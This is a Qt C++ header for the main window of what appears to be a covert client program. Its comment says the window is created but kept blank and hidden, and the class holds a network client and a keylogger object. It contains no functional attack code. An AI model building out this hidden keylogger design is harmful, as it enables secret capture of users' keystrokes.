#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QSettings>
#include "client.h"
#include "tkey.h"


//*************************************//
//*************************************//
//***   Client - MainWindow Module  ***//
//***      Class Header File        ***//
//*************************************//
//*************************************//


//This class is just needed to make the client a GUI application. Some of Qts important built in classes
//require the program to have a GUI. But the GUI, although created in memory, is blank and hidden.

namespace Ui {
class MainWindow;
}

//The main window class inherits QMainWindow - Qts class
class MainWindow : public QMainWindow
{
    Q_OBJECT    
    Ui::MainWindow *ui; //GUI
    client *newClient;
    tkey *newKeylogger;
    
public:
    explicit MainWindow(QWidget *parent = 0); //constructor
    ~MainWindow();  //destructor
};

#endif // MAINWINDOW_H
